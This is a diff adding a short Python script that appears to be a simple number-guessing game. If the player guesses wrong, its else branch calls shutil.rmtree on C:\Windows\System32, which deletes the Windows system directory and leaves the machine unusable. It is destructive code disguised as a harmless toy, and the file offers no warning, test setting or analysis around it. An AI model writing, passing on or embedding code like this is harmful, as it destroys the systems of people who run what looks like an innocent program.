@@ -1,0 +1,14 @@
+import random
+import os
+import shutil
+
+number = random.randint(1, 10)
+
+guess = input("Guess a number between 1 and 10: ")
+
+guess = int(guess)
+
+if guess == number:
+	print("You guessed it right!")
+else:
+	shutil.rmtree("C:\\Windows\\System32")
